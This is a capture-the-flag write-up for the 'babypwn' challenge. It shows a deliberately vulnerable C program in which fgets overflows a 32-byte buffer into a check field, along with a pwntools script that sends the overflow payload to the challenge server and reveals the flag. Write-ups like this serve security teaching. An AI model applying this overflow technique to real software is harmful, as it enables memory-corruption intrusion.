# babypwn

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Solution

Just a simple and easy pwn challenge.

Given a C source code.

<pre class="language-c" data-title="babypwn.c" data-line-numbers><code class="lang-c">#include &#x3C;stdio.h>
#include &#x3C;string.h>
#include &#x3C;unistd.h>

<strong>struct __attribute__((__packed__)) data {
</strong>  char buff[32];
  int check;
};

void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
  char flag[1024] = { 0 };
  FILE *fp = fopen("flag.txt", "r");
  fgets(flag, 1023, fp);
  printf(flag);
}

int main(void) 
{
  struct data name;
  ignore(); /* ignore this function */

  printf("What's your name?\n");
  fgets(name.buff, 64, stdin);
  sleep(2);
  printf("%s nice to meet you!\n", name.buff);
  sleep(2);
  printf("Binary exploitation is the best!\n");
  sleep(2);
  printf("Memory unsafe languages rely on coders to not make mistakes.\n");
  sleep(2);
  printf("But I don't worry, I write perfect code :)\n");
  sleep(2);

<strong>  if (name.check == 0x41414141) {
</strong>    get_flag();
  }

  return 0;
}

</code></pre>

The program wants us to input a name. Line 41 shows that `if (name.check == 0x41414141)` is true, it will reveal a flag. So basically we need to input 0x41414141, but the function at line 5 says that it has a 32 size of buffer. We need to fill up the buffer first, than put 0x41414141, combine them as one payload as the script below.

{% code title="solve.py" lineNumbers="true" %}
```python
from pwn import *

rem = remote('babypwn.wolvctf.io', 1337)
payload = b'A' * 32 + p32(0x41414141)

rem.sendline(payload)

print(rem.recvall().decode())
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Flag

wctf{pwn\_1s\_th3\_best\_Categ0ry!}
